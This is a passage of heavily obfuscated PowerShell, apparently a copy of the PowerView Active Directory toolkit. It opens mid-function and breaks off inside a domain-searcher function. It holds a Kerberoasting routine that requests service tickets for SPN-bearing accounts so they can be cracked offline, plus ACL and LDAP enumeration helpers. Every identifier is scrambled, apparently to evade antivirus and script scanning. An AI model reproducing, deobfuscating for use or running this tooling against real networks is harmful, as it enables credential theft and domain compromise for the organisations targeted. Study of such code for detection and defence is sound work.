        ${Cr`ed`ENTIAl} =   (&("{3}{2}{1}{0}" -f 'le','b','RiA','gEt-VA')  ("pK"+"FEz"+"n") -VALuEO  )::"emP`Ty"
    )

    BEGIN {
        ${usE`RsEAr`CheR`AR`gu`meNtS} = @{
            'SPN' = ${t`RUe}
            ("{2}{1}{0}"-f'operties','r','P') = ("{7}{9}{3}{4}{1}{11}{2}{8}{10}{0}{6}{5}" -f 'paln',',se','icep','distingu','ishedname','e','am','sam','rinc','accountname,','i','rv')
        }
        if (${P`Sbound`PAr`AMeTErS}[("{1}{0}"-f'in','Doma')]) { ${UseRs`earC`HERaRG`U`mEnts}[("{2}{1}{0}"-f 'in','ma','Do')] = ${dom`A`IN} }
        if (${pSbo`UNdPa`Ra`meTe`Rs}[("{0}{2}{1}" -f'LDAPFilt','r','e')]) { ${USErSeaR`cHE`RA`R`GuMEntS}[("{3}{0}{2}{1}" -f'APFi','er','lt','LD')] = ${lDAPf`iLt`er} }
        if (${p`sbO`U`Ndp`ArAMeTe`RS}[("{2}{1}{0}"-f 'Base','h','Searc')]) { ${uS`ERs`EaR`C`heRA`R`gumENTS}[("{1}{0}{2}" -f 'chBas','Sear','e')] = ${sE`Archb`Ase} }
        if (${PsB`ouN`dparAM`ET`E`RS}[("{2}{1}{0}"-f'er','erv','S')]) { ${uSErS`e`A`R`CHerAR`GumenTS}[("{1}{2}{0}"-f 'r','Serv','e')] = ${S`er`VER} }
        if (${ps`BOuNdpa`R`AMEtERS}[("{1}{3}{2}{0}"-f'e','SearchS','p','co')]) { ${User`sE`ArchER`A`Rgu`mE`NTS}[("{0}{1}{2}{3}" -f 'Search','Sc','o','pe')] = ${s`e`ARCHsCO`PE} }
        if (${P`Sbo`U`NDPARamE`T`eRs}[("{2}{1}{0}" -f'Size','Page','Result')]) { ${usERS`e`Ar`chE`R`ARgUm`EnTs}[("{2}{3}{0}{1}"-f'PageSiz','e','Res','ult')] = ${r`ESulTPa`GEs`IZE} }
        if (${PS`BOu`N`DP`ArAmET`ers}[("{2}{1}{0}"-f'imeLimit','erT','Serv')]) { ${u`se`RSeA`RcHerar`GUm`ENTS}[("{0}{2}{1}"-f 'Server','mit','TimeLi')] = ${s`eRv`eRtimeL`I`Mit} }
        if (${psb`O`UndParamE`T`ERS}[("{0}{1}" -f'Tomb','stone')]) { ${Us`eRse`A`RChEr`ARGUmEnTS}[("{2}{0}{1}" -f'mbston','e','To')] = ${t`ombS`TOnE} }
        if (${PsBo`U`N`DPAr`AMETerS}[("{2}{1}{0}"-f 'al','redenti','C')]) { ${Use`RsearCH`e`RARGu`mEntS}[("{2}{1}{0}"-f 'ial','ent','Cred')] = ${C`RedEn`TI`Al} }

        if (${psBoUn`d`PAr`AmetErs}[("{0}{3}{2}{1}" -f'Crede','l','tia','n')]) {
            ${lOG`Ont`OkeN} = &("{3}{2}{1}{5}{0}{4}"-f 'erImpersona','vok','n','I','tion','e-Us') -Credential ${cr`eDeN`Ti`Al}
        }
    }

    PROCESS {
        if (${pSbo`UndPa`RAMET`e`Rs}[("{1}{2}{0}"-f 'tity','Ide','n')]) { ${US`eR`searCh`erar`gum`ents}[("{0}{1}{2}" -f'Id','e','ntity')] = ${IDE`N`TitY} }
        &("{2}{1}{0}{3}{4}"-f 'nU','ai','Get-Dom','se','r') @UserSearcherArguments | &("{0}{2}{1}" -f 'Where','Object','-') {${_}."sAmAccoun`T`NaMe" -ne ("{0}{1}" -f'kr','btgt')} | &("{1}{3}{2}{0}" -f 'et','Get-Doma','Tick','inSPN') -OutputFormat ${OUt`pu`T`FORm`At}
    }

    END {
        if (${lO`GOn`T`OKEn}) {
            &("{4}{3}{0}{5}{6}{2}{1}" -f'ke-Rever','lf','Se','nvo','I','tT','o') -TokenHandle ${l`o`g`ONTOken}
        }
    }
}

function gE`T-paT`HacL {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}" -f'PSShou','l','dP','rocess'}, '')]
    [OutputType({"{1}{0}{2}{4}{3}" -f 'w.','PowerVie','Fi','eACL','l'})]
    [CmdletBinding()]
    Param(
        [Parameter(MandATOrY = ${TR`Ue}, vAlUEFRomPIPELine = ${T`RuE}, VaLUefROMpIPeLInebYpRoPERtYNAME = ${t`RUe})]
        [Alias({"{0}{2}{1}"-f'Fu','lName','l'})]
        [String[]]
        ${p`ATh},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`D`Ent`IaL} =  ${p`kFeZn}::"em`pty"
    )

    BEGIN {

        function C`onveRT-`FIler`ig`HT {
            [CmdletBinding()]
            Param(
                [Int]
                ${f`SR}
            )

            ${aCCES`sM`A`sk} = @{
                [uint32]("{3}{2}{0}{1}" -f'00','0000','x80','0') = ("{2}{3}{0}{1}" -f'er','icRead','Ge','n')
                [uint32]("{0}{2}{1}"-f '0x40','00000','0') = ("{2}{1}{0}" -f'ricWrite','ene','G')
                [uint32]("{1}{2}{0}"-f '00000','0x','200') = ("{0}{3}{1}{2}{4}"-f'Generic','x','e','E','cute')
                [uint32]("{1}{2}{0}"-f '0','0x100','0000') = ("{2}{0}{1}{3}" -f 'icA','l','Gener','l')
                [uint32]("{0}{1}{2}"-f'0x0200','000','0') = ("{0}{1}{2}{4}{3}"-f'Max','imumAl','l','wed','o')
                [uint32]("{1}{0}{2}{3}" -f '00','0x01','00','00') = ("{2}{0}{3}{1}"-f'cessSys','ty','Ac','temSecuri')
                [uint32]("{3}{0}{2}{1}"-f '0010','000','0','0x') = ("{2}{1}{0}" -f'nize','ro','Synch')
                [uint32]("{0}{2}{3}{1}"-f '0','00','x000','800') = ("{2}{1}{0}" -f'r','riteOwne','W')
                [uint32]("{3}{0}{2}{1}"-f '4','00','00','0x000') = ("{0}{1}{2}"-f'Wri','teDA','C')
                [uint32]("{1}{2}{0}"-f '0020000','0x','0') = ("{1}{0}{2}{3}"-f 'ea','R','dCo','ntrol')
                [uint32]("{0}{2}{3}{1}"-f'0','00','x000','100') = ("{2}{0}{1}" -f 'el','ete','D')
                [uint32]("{1}{2}{0}{3}" -f'0','0','x00','00100') = ("{0}{1}{3}{2}"-f 'Wr','iteAtt','es','ribut')
                [uint32]("{1}{0}{2}" -f 'x00000','0','080') = ("{2}{4}{0}{1}{3}" -f'dAttrib','u','R','tes','ea')
                [uint32]("{1}{3}{0}{2}" -f '00000','0','40','x0') = ("{0}{1}{2}"-f'De','leteChi','ld')
                [uint32]("{2}{0}{1}"-f'0','020','0x0000') = ("{2}{1}{0}{3}" -f'e/Travers','cut','Exe','e')
                [uint32]("{0}{2}{3}{1}" -f'0x0','010','0','000') = ("{5}{2}{1}{6}{0}{3}{4}"-f 'ExtendedAt','it','r','tri','butes','W','e')
                [uint32]("{0}{1}{2}" -f '0','x0','0000008') = ("{0}{2}{1}{3}" -f 'R','ibu','eadExtendedAttr','tes')
                [uint32]("{0}{1}{2}" -f'0x0000','00','04') = ("{2}{1}{4}{5}{3}{0}{6}" -f 'Data/AddSubdirect','p','A','d','p','en','ory')
                [uint32]("{1}{2}{0}"-f'02','0x00','0000') = ("{4}{0}{3}{2}{1}{5}" -f'ri','AddFil','ata/','teD','W','e')
                [uint32]("{3}{0}{1}{2}" -f 'x000','00','001','0') = ("{4}{0}{2}{3}{1}" -f'a','ctory','/ListDir','e','ReadDat')
            }

            ${S`im`Plep`ermiS`Si`oNS} = @{
                [uint32]("{1}{2}{0}"-f'ff','0x1','f01') = ("{3}{2}{1}{0}" -f 'rol','t','lCon','Ful')
                [uint32]("{2}{1}{0}"-f'1bf','0','0x03') = ("{2}{1}{0}" -f'ify','od','M')
                [uint32]("{1}{0}"-f'9','0x0200a') = ("{1}{4}{3}{2}{0}"-f 'te','ReadA','cu','dExe','n')
                [uint32]("{0}{1}"-f'0x02019','f') = ("{2}{0}{1}{3}"-f'dAn','dW','Rea','rite')
                [uint32]("{2}{0}{1}"-f '02008','9','0x') = ("{1}{0}" -f'ead','R')
                [uint32]("{1}{0}"-f '16','0x0001') = ("{1}{0}"-f'rite','W')
            }

            ${P`E`RMis`SIoNs} = @()

            ${PERMIs`SI`o`Ns} += ${SI`MP`Le`PERMIS`SI`OnS}."kE`YS" | &("{0}{3}{2}{1}" -f'ForEa','ject','Ob','ch-') {
                              if ((${F`Sr} -band ${_}) -eq ${_}) {
                                ${SI`m`P`le`permisSI`ons}[${_}]
                                ${f`SR} = ${F`sr} -band (-not ${_})
                              }
                            }

            ${Pe`RMiSs`i`Ons} += ${a`CCe`sSM`ASk}."ke`Ys" | &("{2}{3}{1}{0}" -f'ct','Obje','W','here-') { ${F`SR} -band ${_} } | &("{4}{3}{2}{0}{1}"-f 'Ea','ch-Object','r','o','F') { ${AcceS`sM`A`sk}[${_}] }
            (${P`Erm`ISsI`onS} | &("{1}{2}{0}"-f 'ject','Wh','ere-Ob') {${_}}) -join ','
        }

        ${C`oNver`TArGU`mEntS} = @{}
        if (${PSb`ouNdpARA`ME`TErs}[("{2}{0}{1}" -f'nti','al','Crede')]) { ${con`VeRta`Rg`UmeNts}[("{1}{0}{2}"-f 'enti','Cred','al')] = ${cReD`eNT`ial} }

        ${m`APPe`dc`oMPuTErS} = @{}
    }

    PROCESS {
        ForEach (${TAr`G`eTPa`TH} in ${Pa`TH}) {
            try {
                if ((${T`AR`geTpath} -Match ((("{4}{0}{3}{1}{2}" -f '{','.*{','0}{0}.*','0}{0}','{0}{0}'))  -f[CHaR]92)) -and (${psBO`UnDPA`Ram`ET`Ers}[("{0}{3}{2}{1}" -f 'Cre','l','ia','dent')])) {
                    ${h`oST`cOm`Put`er} = (&("{1}{0}{2}"-f'O','New-','bject') ("{2}{1}{0}{3}" -f'.','stem','Sy','Uri')(${TAR`geT`p`AtH}))."H`oSt"
                    if (-not ${mapp`edcO`Mp`Ut`ErS}[${H`osT`c`oMputER}]) {

                        &("{0}{1}{2}{4}{3}{5}" -f 'Add-R','emot','e','t','Connec','ion') -ComputerName ${hO`S`TC`oMpUTeR} -Credential ${C`R`edEnti`AL}
                        ${mA`PpE`dcO`MPU`Ters}[${hoSt`c`o`mpUTEr}] = ${tR`UE}
                    }
                }

                ${a`cl} = &("{1}{0}"-f'Acl','Get-') -Path ${t`ARg`ETP`ATH}

                ${A`CL}."geT`Ac`cE`SsRuLEs"(${T`Rue}, ${tr`Ue}, [System.Security.Principal.SecurityIdentifier]) | &("{2}{3}{1}{0}"-f 'ach-Object','E','Fo','r') {
                    ${s`Id} = ${_}."IdeNT`i`TyRe`FeReNcE"."v`AluE"
                    ${N`AmE} = &("{2}{0}{1}"-f 'rom-','SID','ConvertF') -ObjectSID ${S`id} @ConvertArguments

                    ${o`UT} = &("{2}{1}{0}"-f 't','w-Objec','Ne') ("{1}{0}"-f'ject','PSOb')
                    ${O`Ut} | &("{0}{1}{2}" -f 'Add-','M','ember') ("{0}{1}{2}{3}"-f'Notepro','pe','rt','y') ("{1}{0}"-f'th','Pa') ${tA`RGEt`pA`Th}
                    ${O`Ut} | &("{0}{2}{1}"-f'Ad','mber','d-Me') ("{2}{3}{0}{1}"-f 'e','rty','Note','prop') ("{4}{3}{2}{1}{0}"-f's','ight','mR','Syste','File') (&("{0}{2}{3}{1}"-f 'Conve','leRight','rt-','Fi') -FSR ${_}."f`iL`eS`y`st`EMrIghts"."vAlU`e__")
                    ${O`Ut} | &("{0}{1}{2}"-f 'Add-','Me','mber') ("{2}{1}{0}"-f 'property','te','No') ("{0}{3}{1}{2}" -f 'Iden','efe','rence','tityR') ${N`AmE}
                    ${o`Ut} | &("{1}{0}{2}"-f 'mbe','Add-Me','r') ("{1}{0}{2}{3}"-f'teprope','No','rt','y') ("{3}{2}{1}{0}" -f'ID','yS','t','Identi') ${s`Id}
                    ${O`UT} | &("{3}{1}{0}{2}" -f'e','b','r','Add-Mem') ("{3}{0}{2}{1}" -f 'tepro','rty','pe','No') ("{0}{3}{1}{4}{2}"-f'Acc','sCon','rolType','es','t') ${_}."acceSs`CO`N`T`RoLtypE"
                    ${o`Ut}."P`s`object"."T`Y`PENAMeS".("{2}{1}{0}" -f 'rt','se','In').Invoke(0, ("{2}{1}{5}{3}{0}{4}" -f 'AC','ow','P','w.File','L','erVie'))
                    ${o`Ut}
                }
            }
            catch {
                &("{1}{2}{0}" -f'rbose','Writ','e-Ve') ('[Get-'+'Path'+'Ac'+'l] '+'erro'+'r: '+"$_")
            }
        }
    }

    END {

        ${M`AppeDc`oMpute`RS}."ke`YS" | &("{2}{1}{4}{3}{0}{5}" -f 'tio','e-Rem','Remov','Connec','ote','n')
    }
}

function co`NVE`Rt-`L`DaPprOP`ErtY {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{4}{0}" -f 's','ld','P','PSShou','roces'}, '')]
    [OutputType({"{3}{6}{0}{1}{7}{2}{4}{5}" -f'Manage','men','P','Syst','SCustomObj','ect','em.','t.Automation.'})]
    [CmdletBinding()]
    Param(
        [Parameter(ManDaToRy = ${t`RuE}, vAlUEfRoMpIpELINe = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        ${PROpErT`i`Es}
    )

    ${ObJ`e`C`TP`RoPe`RTiEs} = @{}

    ${P`ROpeR`T`IeS}."Prop`e`RTY`N`Ames" | &("{1}{0}{2}{3}{4}" -f 'o','F','rE','ach-Objec','t') {
        if (${_} -ne ("{1}{0}{2}"-f'spa','ad','th')) {
            if ((${_} -eq ("{2}{1}{0}" -f 'id','s','object')) -or (${_} -eq ("{0}{1}{2}" -f 's','idhi','story'))) {

                ${OBJeCtp`R`ope`RTiES}[${_}] = ${pr`opEr`TiEs}[${_}] | &("{1}{2}{3}{4}{0}" -f 't','Fo','rEac','h-Obje','c') { (&("{0}{1}{2}" -f'New-','Ob','ject') ("{3}{8}{6}{4}{0}{7}{2}{1}{5}"-f 'ipal','ityIdenti','cur','S','.Princ','fier','ecurity','.Se','ystem.S')(${_}, 0))."VAl`Ue" }
            }
            elseif (${_} -eq ("{2}{1}{0}"-f'pe','y','groupt')) {
                ${OBjectPRo`Per`T`ieS}[${_}] = ${pr`Ope`RtieS}[${_}][0] -as ${gR`oU`Ptypee`N`UM}
            }
            elseif (${_} -eq ("{1}{3}{2}{0}"-f'ttype','sa','ccoun','ma')) {
                ${oBj`eC`TProp`eRTI`ES}[${_}] = ${pRoPerT`I`es}[${_}][0] -as ${S`Am`A`ccOu`NTtY`peEnum}
            }
            elseif (${_} -eq ("{1}{0}{2}" -f'tg','objec','uid')) {

                ${obje`cTpRO`Pe`RTIES}[${_}] = (&("{1}{2}{0}" -f't','New-O','bjec') ("{0}{1}"-f 'Gu','id') (,${p`RoPe`RtieS}[${_}][0]))."g`UiD"
            }
            elseif (${_} -eq ("{1}{2}{0}{3}"-f 'ntcon','use','raccou','trol')) {
                ${O`B`JEcT`pR`opeRtiEs}[${_}] = ${pRoPe`RtI`es}[${_}][0] -as ${ua`cE`NUm}
            }
            elseif (${_} -eq ("{0}{4}{3}{1}{2}{5}" -f'nts','rityd','escrip','u','ec','tor')) {

                ${dE`SCRIP`TOR} = &("{0}{1}{2}" -f 'New','-Objec','t') ("{2}{6}{0}{5}{4}{1}{7}{3}" -f'on','curi','Security.Acces','tor','rol.RawSe','t','sC','tyDescrip') -ArgumentList ${pR`OP`Er`TIEs}[${_}][0], 0
                if (${D`es`cRIPTOR}."oWN`ER") {
                    ${oBje`c`TPrOP`ERT`IEs}[("{0}{1}"-f 'Owne','r')] = ${DESc`R`IptOr}."o`Wner"
                }
                if (${DES`CRI`p`TOr}."g`Roup") {
                    ${obJeC`TP`ROPe`RtieS}[("{0}{1}"-f'Gr','oup')] = ${DES`cr`iPToR}."g`ROUP"
                }
                if (${DE`s`cript`oR}."dI`screTi`onar`Y`Acl") {
                    ${OB`JE`c`Tp`RoPerties}[("{2}{3}{4}{0}{1}"-f'onar','yAcl','Disc','r','eti')] = ${deSC`R`I`ptOr}."DI`sCre`TIONa`RYA`cl"
                }
                if (${D`escr`I`pTOR}."Sy`st`EmACl") {
                    ${obJE`c`TP`R`OPeRtIes}[("{0}{1}{2}"-f'S','ystemA','cl')] = ${DeScRI`Pt`OR}."syST`Em`ACl"
                }
            }
            elseif (${_} -eq ("{2}{1}{0}"-f'ountexpires','cc','a')) {
                if (${pROPe`R`Ti`es}[${_}][0] -gt  (&("{1}{2}{3}{0}"-f'LE','GEt-vAr','iA','B') ("{1}{0}"-f'O','0D') -ValuEO  )::"mA`XvaL`UE"."t`iCks") {
                    ${Obj`ECtp`ROPER`TIEs}[${_}] = ("{1}{0}" -f'EVER','N')
                }
                else {
                    ${oBjECtPR`Op`e`RT`ies}[${_}] =  ( &("{3}{2}{0}{1}"-f 'IABl','E','vAR','gEt-') ("0D"+"o")  )."v`ALuE"::"fRoMf`I`LET`IMe"(${pRoP`E`RTi`eS}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{0}{1}{2}"-f 'last','lo','gon')) -or (${_} -eq ("{1}{4}{2}{3}{0}{5}" -f'times','l','tlog','on','as','tamp')) -or (${_} -eq ("{1}{0}{2}" -f'ts','pwdlas','et')) -or (${_} -eq ("{0}{1}{3}{2}" -f'l','as','ff','tlogo')) -or (${_} -eq ("{4}{2}{1}{3}{0}"-f'e','sswo','dPa','rdTim','ba')) ) {

                if (${PrOP`eRTi`eS}[${_}][0] -is [System.MarshalByRefObject]) {

                    ${Te`MP} = ${pR`OpER`TI`es}[${_}][0]
                    [Int32]${h`iGh} = ${T`eMP}.("{1}{0}" -f'ype','GetT').Invoke().("{2}{3}{1}{0}" -f'r','be','I','nvokeMem').Invoke(("{0}{1}{2}"-f 'Hig','hPa','rt'),   ( &("{1}{2}{3}{0}" -f 'E','ge','T','-VARIABL')  ("{0}{1}" -f'7Gx','J'))."Va`LUe"::"g`ETpr`O`pERtY", ${N`UlL}, ${T`emp}, ${nu`LL})
                    [Int32]${L`oW}  = ${te`mp}.("{1}{2}{0}"-f 'e','GetTy','p').Invoke().("{0}{1}{2}" -f'Inv','okeMembe','r').Invoke(("{1}{0}" -f 'owPart','L'),   ${7`gxJ}::"ge`T`PRoPERTy", ${N`ULl}, ${T`EMp}, ${N`ULl})
                    ${o`B`JECTP`ROpERTIes}[${_}] = ( (  &("{1}{3}{0}{2}" -f'a','get-','RIABlE','V')  ("{1}{0}"-f'O','0D')  -vALuEOnLY )::"F`ROMF`iLeTI`me"([Int64]("0x{0:x8}{1:x8}" -f ${hi`gH}, ${L`oW})))
                }
                else {

                    ${OBjeCtp`R`oPer`Ti`eS}[${_}] = ( ${0`dO}::"f`ROMfiLe`TIME"((${PrO`p`ERtiES}[${_}][0])))
                }
            }
            elseif (${p`Ro`p`ERTIes}[${_}][0] -is [System.MarshalByRefObject]) {

                ${pr`op} = ${propE`R`T`IES}[${_}]
                try {
                    ${T`EMP} = ${p`Rop}[${_}][0]
                    [Int32]${h`igH} = ${Te`MP}.("{0}{2}{1}"-f'G','tType','e').Invoke().("{0}{3}{2}{1}"-f 'Invok','er','b','eMem').Invoke(("{0}{1}{2}"-f'Hi','g','hPart'),   (&("{3}{2}{0}{1}" -f 'cHi','LdItem','ET-','G')  ("{1}{0}{2}" -f'r','VA','iaBlE:7gXJ')  )."Va`LuE"::"gETP`R`OPER`Ty", ${n`UlL}, ${TE`Mp}, ${nu`Ll})
                    [Int32]${L`Ow}  = ${te`Mp}.("{2}{0}{1}" -f'tT','ype','Ge').Invoke().("{1}{2}{0}"-f 'ember','Invok','eM').Invoke(("{1}{0}" -f't','LowPar'),    ( &("{0}{2}{1}" -f'var','lE','IAB') ('7'+'gXJ') -Va  )::"GETpr`OP`ERtY", ${Nu`LL}, ${TE`mp}, ${n`Ull})
                    ${Obj`ECtpr`oPe`Rt`Ies}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${h`igH}, ${L`OW})
                }
                catch {
                    &("{0}{2}{1}"-f 'Wr','ose','ite-Verb') ('[Co'+'nvert'+'-LDAPPr'+'o'+'pert'+'y'+'] '+'err'+'or: '+"$_")
                    ${o`BjE`C`T`properTiEs}[${_}] = ${p`RoP}[${_}]
                }
            }
            elseif (${pRo`PER`TIeS}[${_}]."c`OuNt" -eq 1) {
                ${oBJe`CT`Pr`o`pERTiES}[${_}] = ${pROp`E`Rti`ES}[${_}][0]
            }
            else {
                ${ObJE`Ct`proPert`i`Es}[${_}] = ${p`R`opER`TIES}[${_}]
            }
        }
    }
    try {
        &("{2}{1}{0}" -f'Object','w-','Ne') -TypeName ("{2}{1}{0}" -f 'Object','S','P') -Property ${ObJeC`T`Pr`O`pErtiEs}
    }
    catch {
        &("{1}{3}{0}{2}" -f'-Warni','Writ','ng','e') ('['+'Conv'+'ert-LD'+'APPr'+'ope'+'rty] '+'Erro'+'r '+'pa'+'rsi'+'ng '+'LD'+'AP '+'prope'+'r'+'ti'+'es '+': '+"$_")
    }
}

function GeT`-DoMaiNS`eARc`her {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{2}{0}"-f's','P','roces','PSShould'}, '')]
    [OutputType({"{4}{8}{2}{6}{7}{0}{5}{3}{1}" -f'ecto','er','cto','rch','Sys','rySea','ryServices.Di','r','tem.Dire'})]
    [CmdletBinding()]
    Param(
        [Parameter(VALUEfrOmPIpelinE = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`MA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'ilt','er','F'})]
        [String]
        ${LD`AP`FI`lTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prop`ert`ieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'A','DSPath'})]
        [String]
        ${sEA`RC`HBA`Se},

        [ValidateNotNullOrEmpty()]
        [String]
        ${sea`RcH`BA`SeP`REFiX},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}{4}" -f'rolle','ainCont','m','Do','r'})]
        [String]
        ${Serv`Er},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{1}" -f 'OneLev','el'}, {"{1}{2}{0}" -f 'e','Su','btre'})]
        [String]
        ${Se`Archs`COpe} = ("{1}{0}" -f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esULt`paGe`s`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VERtI`M`eLimit} = 120,

        [ValidateSet({"{0}{1}" -f 'Da','cl'}, {"{1}{0}" -f'roup','G'}, {"{0}{1}"-f'Non','e'}, {"{1}{0}"-f 'wner','O'}, {"{1}{0}"-f 'cl','Sa'})]
        [String]
        ${secu`RI`TYMasKS},

        [Switch]
        ${TOM`B`STONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDe`NTIaL} =  (  &("{0}{1}" -f'g','CI') ("{1}{4}{2}{0}{3}"-f'ble:PKfEz','V','iA','N','ar') )."Val`Ue"::"emp`Ty"
    )

    PROCESS {
        if (${Psbo`Undpa`RamETE`Rs}[("{1}{0}"-f'n','Domai')]) {
            ${T`ARGet`D`omAin} = ${d`omA`in}

            if (${eNV:U`serdNS`dom`AIN} -and (${ENv`:U`SerDN`Sd`OMAIn}.("{0}{1}" -f'T','rim').Invoke() -ne '')) {

                ${USEr`D`O`mAIn} = ${EnV:`UseRdNsd`o`m`A`in}
                if (${e`NV:loG`on`SERvEr} -and (${eN`V:L`OGoNSe`RVer}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') -and ${US`erDoM`AIN}) {
                    ${b`I`NdSeRveR} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${PsBO`UN`DPAR`A`mEterS}[("{2}{1}{0}" -f'tial','en','Cred')]) {

            ${dom`AInoBJ`eCT} = &("{1}{2}{0}"-f'n','Get-Dom','ai') -Credential ${cre`dE`NTiAl}
            ${Bi`NdSe`RvEr} = (${domA`INob`J`e`CT}."pdC`ROlE`oW`NER")."NA`Me"
            ${tArG`E`TDo`MA`IN} = ${dOM`AInob`J`Ect}."NA`ME"
        }
        elseif (${enV:U`SErDNsDOM`A`in} -and (${eNv:USe`RdNs`d`OM`AIn}.("{1}{0}" -f 'm','Tri').Invoke() -ne '')) {

            ${TARg`e`TDOma`IN} = ${EnV`:`USe`R`dnSdO`MAIN}
            if (${e`NV`:LOg`ONsER`Ver} -and (${e`NV:l`oGo`NS`eRVER}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') -and ${tA`R`get`D`oMaiN}) {
                ${bINd`se`R`VEr} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {

            &("{3}{0}{2}{1}" -f 'te','erbose','-v','wri') ("{2}{0}{1}"-f 'a','in','get-dom')
            ${D`oma`i`NoB`jEct} = &("{2}{0}{1}"-f 'et','-Domain','G')
            ${BI`N`DSEr`VEr} = (${D`o`M`A`INobJeCT}."pDC`RO`LEo`wNER")."NA`me"
            ${Tar`G`ET`do`mAIN} = ${doma`In`OBJECt}."n`AME"
        }

        if (${p`SbounDP`Ar`AmE`TeRS}[("{0}{1}{2}"-f'Se','r','ver')]) {

            ${Bin`d`sERver} = ${serV`eR}
        }

        ${searcH`STR`INg} = ("{1}{0}{2}" -f'DAP:/','L','/')

        if (${BIn`DsE`RveR} -and (${B`I`Nd`SeRVEr}.("{1}{0}" -f 'rim','T').Invoke() -ne '')) {
            ${SeA`R`CHs`TRiNg} += ${BI`Nd`S`ERVer}
            if (${ta`Rge`TDO`MaiN}) {
                ${SE`AR`C`Hs`TrING} += '/'
            }
        }

        if (${PsboUn`DpaR`AMet`ERs}[("{4}{2}{0}{3}{1}"-f'archBa','ix','e','sePref','S')]) {
            ${s`eA`RChst`RiNG} += ${s`eARc`Hb`ASe`PReFIx} + ','
        }

        if (${psb`oUN`D`PaRamETERS}[("{0}{1}{2}" -f'S','e','archBase')]) {
            if (${SEARCHB`A`sE} -Match ("{0}{1}"-f '^','GC://')) {

                ${DN} = ${seaRC`H`BASe}.("{0}{1}"-f'ToUpp','er').Invoke().("{0}{1}" -f 'T','rim').Invoke('/')
                ${SEA`RChStr`I`NG} = ''
            }
            else {
                if (${s`eArC`HBASE} -match ("{0}{1}"-f '^L','DAP://')) {
                    if (${SE`A`R`cHbaSE} -match ("{0}{2}{1}"-f'L','+','DAP://.+/.')) {
                        ${s`eaRCHs`TRING} = ''
                        ${D`N} = ${SeARC`h`BaSe}
                    }
                    else {
                        ${d`N} = ${seArC`H`Base}.("{2}{1}{0}"-f 'tring','S','Sub').Invoke(7)
                    }
                }
                else {
                    ${D`N} = ${SEA`Rc`h`BAse}
                }
            }
        }
        else {

            if (${tARg`etD`O`MAin} -and (${tarG`etdo`mAin}.("{1}{0}" -f'rim','T').Invoke() -ne '')) {
                ${dN} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${se`ArC`HsTRinG} += ${dN}
        &("{0}{1}{2}"-f 'Write-Ve','rbo','se') ('[Get-D'+'o'+'mai'+'nSearcher]'+' '+'sear'+'c'+'h '+'b'+'ase: '+"$SearchString")

        if (${C`Re`D`enTial} -ne  (&("{0}{2}{1}" -f 'vaRI','bLe','A') ("pKF"+"EZN") )."VAl`UE"::"E`mptY") {
            &("{1}{3}{2}{0}"-f'ose','Write-','erb','V') ("{15}{5}{17}{7}{12}{2}{16}{10}{1}{3}{0}{13}{11}{9}{14}{6}{4}{8}"-f 'n','alte','r] U','r','L','t-',' ','mai','DAP connection','al','ing ',' credenti','nSearche','ate','s for','[Ge','s','Do')

            ${dOMAI`No`B`JeCT} = &("{1}{0}{2}" -f'b','New-O','ject') ("{6}{5}{4}{2}{1}{0}{3}{8}{7}" -f'ices','v','r','.Di','torySe','c','Dire','ryEntry','recto')(${S`EaRcHst`RI`Ng}, ${cr`e`dENTIaL}."usE`Rna`mE", ${C`R`EDen`TiAl}.("{1}{0}{2}{3}{4}"-f 'twor','GetNe','kCre','dentia','l').Invoke()."p`ASSwo`RD")
            ${seaR`C`HeR} = &("{2}{0}{1}"-f'O','bject','New-') ("{7}{0}{8}{3}{5}{6}{9}{2}{4}{10}{1}"-f'stem.','er','irectory','rectoryServi','Sea','ces','.','Sy','Di','D','rch')(${d`omaI`N`ObJEct})
        }
        else {

            ${sEa`R`CHer} = &("{0}{1}{2}" -f 'New-','Objec','t') ("{6}{7}{3}{9}{11}{10}{5}{12}{1}{4}{8}{2}{0}" -f'cher','ct','ySear','i','o','ervi','Sys','tem.D','r','rec','oryS','t','ces.Dire')([ADSI]${SEAR`chS`TR`InG})
        }

        ${S`earcH`eR}."p`AGEsi`ze" = ${R`eSU`LTp`AG`eSiZe}
        ${s`EaRcHER}."seaR`cHSCO`Pe" = ${SeaRc`hSC`o`Pe}
        ${sE`Arc`HER}."C`AC`HerEs`UlTS" = ${fa`LSe}
        ${s`eAr`CheR}."reFE`Rra`lchASI`Ng" =  ( &("{1}{0}{2}"-f'e','get-CHilDit','M') ('var'+'iab'+'LE:1lHS') )."vaL`UE"::"a`LL"

        if (${PS`BOUnDpa`RaMeT`erS}[("{0}{4}{3}{1}{2}" -f'Se','eLim','it','verTim','r')]) {
            ${SEa`Rc`HER}."S`erV`erTim`e`liMIT" = ${SErvE`RT`IM`eliMIT}
        }

        if (${psb`oUn`dpaRam`eTE`Rs}[("{2}{1}{0}" -f'ne','ombsto','T')]) {
            ${S`eaRCheR}."T`OmbSTO`Ne" = ${tR`UE}
        }

        if (${p`sBo`UnDPar`Am`eters}[("{2}{0}{1}"-f 'APFi','lter','LD')]) {
            ${sE`A`RCheR}."Fi`LTEr" = ${L`dapf`iL`TEr}
        }

